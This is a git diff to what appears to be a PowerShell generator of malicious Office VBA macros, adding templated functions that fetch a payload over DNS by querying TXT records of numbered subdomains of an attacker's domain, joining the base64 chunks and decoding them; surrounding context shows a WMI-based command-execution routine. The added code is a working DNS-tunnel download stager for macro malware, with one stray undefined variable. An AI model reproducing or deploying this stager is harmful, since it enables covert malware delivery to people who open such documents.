@@ -129,6 +129,95 @@ End Function
 "@
 
 #------------------------------------------------------------------------------------------
+$downloadFromDNSHeaders=@"
+Private Declare Function DnsQuery Lib "dnsapi" Alias "DnsQuery_A" (ByVal strname As String, ByVal wType As Integer, ByVal fOptions As Long, ByVal pServers As Long, ppQueryResultsSet As Long, ByVal pReserved As Long) As Long
+Private Declare Function DnsRecordListFree Lib "dnsapi" (ByVal pDnsRecord As Long, ByVal FreeType As Long) As Long
+Private Declare Function lstrlen Lib "kernel32" (ByVal straddress As Long) As Long
+Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, ByVal Source As Long, ByVal Length As Long)
+Private Declare Function inet_addr Lib "ws2_32.dll" (ByVal sAddr As String) As Long
+
+Private Type _TXTRecord_
+    _pNext_           As Long
+    _pName_           As Long
+    _wType_           As Integer
+    _wDataLength_     As Integer
+    _flags_           As Long
+    _dwTel_           As Long
+    _dwReserved_      As Long
+    _prt_             As Long
+    _pStringArray_    As Long
+End Type
+
+"@
+
+#------------------------------------------------------------------------------------------
+$downloadFromDNS=@"
+Private Function #DownloadFromDNS#(_domain_ As String, Optional _sDnsServers_ As String) As Byte()
+    Dim _rawData_, _init_, res As String
+    Dim _nbChunk_ As Long
+    
+    _rawData_ = #GetData#("init" & "." & _domain_, _sDnsServers_)
+    If _rawData_ = "" Then
+        Exit Function
+    End If
+    
+    _init_ = StrConv(#Base64Decode#(_rawData_), vbUnicode)
+    _nbChunk_ = CLng(Split(_init_, "|")(1))
+    
+    Dim i As Long
+    i = 0
+    res = ""
+    While (i < _nbChunk_)
+        _rawData_ = #GetData#(CStr(i) & "." & _domain_, _sDnsServers_)
+        If _rawData_ <> "" Then
+            res = res & _rawData_
+            i = i + 1
+        End If
+    Wend
+    
+    #DownloadFromDNS# = #Base64Decode#(res)
+
+End Function
+
+Private Function #GetData#(_sAddr_ As String, Optional _sDnsServers_ As String) As String
+    Dim _pRecord_     As Long
+    Dim _pNext_       As Long
+    Dim _uRecord_     As _TXTRecord_
+    Dim _vSplit_      As Variant
+    Dim _laServers_() As Long
+    Dim _pServers_    As Long
+    Dim _sName_       As String
+
+    If LenB(_sDnsServers_) <> 0 Then
+        _vSplit_ = Split(_sDnsServers_)
+        ReDim _laServers_(0 To UBound(_vSplit_) + 1)
+        _laServers_(0) = UBound(_laServers_)
+        For lPtr = 0 To UBound(_vSplit_)
+            _laServers_(lPtr + 1) = inet_addr(_vSplit_(lPtr))
+        Next
+        _pServers_ = VarPtr(_laServers_(0))
+    End If
+    If DnsQuery(_sAddr_, &H10, &H8, _pServers_, _pRecord_, 0) = 0 Then
+        _pNext_ = _pRecord_
+        Do While _pNext_ <> 0
+            Call CopyMemory(_uRecord_, _pNext_, Len(_uRecord_))
+            If _uRecord_._wType_ = &H10 Then
+                _sName_ = String(lstrlen(_uRecord_._pStringArray_), 0)
+                Call CopyMemory(ByVal _sName_, _uRecord_._pStringArray_, Len(_sName_))
+                If LenB(Resolve) <> 0 Then
+                    #GetData# = #GetData# & " "
+                End If
+                #GetData# = #GetData# & _sName_
+            End If
+            _pNext_ = _uRecord_._pNext_
+        Loop
+        Call DnsRecordListFree(_pRecord_, 1)
+    End If
+End Function
+
+"@
+
+#------------------------------------------------------------------------------------------
 $executeCommandOne=@"
 Private Sub #ExecuteCommandOne#(ByVal str As String)
 	Set _objWMIService_ = GetObject(-"winmgmts:\\.\root\cimv2"-)
